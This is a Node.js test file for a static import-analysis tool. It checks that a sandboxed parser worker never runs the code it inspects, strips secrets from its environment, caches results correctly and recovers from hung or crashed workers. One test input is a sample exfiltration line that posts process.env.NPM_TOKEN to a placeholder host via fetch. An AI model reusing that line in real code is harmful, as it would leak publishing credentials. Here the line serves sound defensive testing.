'use strict';
const { test } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const { spawnSync } = require('child_process');
const { isolatedBatch, workerEnvironment } = require('../lib/isolated-ast');
const { astImports, loadParser, createAstAnalyzer } = require('../lib/ast-imports');
const cache = require('../lib/ast-cache');
const { mkTmpDir } = require('./helpers');

test('batch worker preserves each result and does not execute inspected code', () => {
  const parser = loadParser();
  const inputs = ["globalThis.marker='not executed'; throw Error('never execute');", 'const =',
    "fetch('https://service.test',{body:JSON.stringify({token:process.env.NPM_TOKEN})});"]
    .map((code, i) => ({ code, file:`${i}.js`, sourceType:'script', identity:parser.identity }));
  assert.deepEqual(isolatedBatch(inputs), inputs.map((i) => astImports(parser,i.code,i.file,i.sourceType)));
});

test('cache separates source, filename, source mode and parser identity; results are copied', () => {
  cache.clear();
  const input={code:'x',file:'a.js',sourceType:'script',identity:'one'};
  const key=cache.cacheKey(input);
  for (const change of [{code:'y'},{file:'a.ts'},{sourceType:'module'},{identity:'two'}]) assert.notEqual(key,cache.cacheKey({...input,...change}));
  cache.put(key,{parsed:true,references:[]});
  cache.get(key).references.push('mutated');
  assert.deepEqual(cache.get(key).references,[]);
  cache.put('failed',{parsed:false,references:[{reason:'ast-timeout'}]});
  assert.equal(cache.get('failed'),null);
  const root=mkTmpDir('ast-cache');
  try {
    const analyze=createAstAnalyzer(root,loadParser());
    const a=analyze('index.js',"require('fs');");
    a.references.length=0;
    assert.ok(analyze('index.js',"require('fs');").references.length);
    assert.equal(analyze('index.js','const n=1;').references.length,0);
  } finally {fs.rmSync(root,{recursive:true,force:true});cache.clear();}
});

test('parser environment excludes secrets and Node injection options', () => {
  process.env.CAPSURFACE_TEST_SECRET='secret';
  try {assert.equal(workerEnvironment().CAPSURFACE_TEST_SECRET,undefined);assert.equal(workerEnvironment().NODE_OPTIONS,undefined);}
  finally {delete process.env.CAPSURFACE_TEST_SECRET;}
});

test('a stalled batch file is killed and reaped, then the next file recovers', () => {
  const root=mkTmpDir('batch-timeout');
  try {
    const tool=path.join(root,'tool');
    fs.cpSync(path.join(__dirname,'../lib'),path.join(tool,'lib'),{recursive:true});
    const pid=path.join(root,'pid');
    fs.writeFileSync(path.join(tool,'lib/ast-worker.js'), `
      require('readline').createInterface({input:process.stdin}).on('line',line=>{
        const input=JSON.parse(line);
        if(input.code==='hang'){require('fs').writeFileSync(${JSON.stringify(pid)},String(process.pid));while(true){}}
        if(input.code==='crash')process.exit(2);
        if(input.code==='broken'){process.stdout.write('broken\\n');return;}
        process.stdout.write(JSON.stringify({parsed:true,references:[]})+'\\n');
      });
    `);
    const result=spawnSync(process.execPath,[path.join(tool,'lib/ast-batch-worker.js')],{
      input:JSON.stringify([{code:'hang'},{code:'ok'},{code:'crash'},{code:'ok'},{code:'broken'},{code:'ok'}]),encoding:'utf8',timeout:15000,
    });
    assert.equal(result.status,0,result.stderr);
    const results=JSON.parse(result.stdout);
    assert.equal(results[0].references[0].reason,'ast-timeout');
    assert.equal(results[1].parsed,true);
    for(const index of [2,4])assert.equal(results[index].references[0].reason,'ast-worker-error');
    for(const index of [3,5])assert.equal(results[index].parsed,true);
    assert.throws(()=>process.kill(Number(fs.readFileSync(pid,'utf8')),0),{code:'ESRCH'});
  } finally {fs.rmSync(root,{recursive:true,force:true});}
});
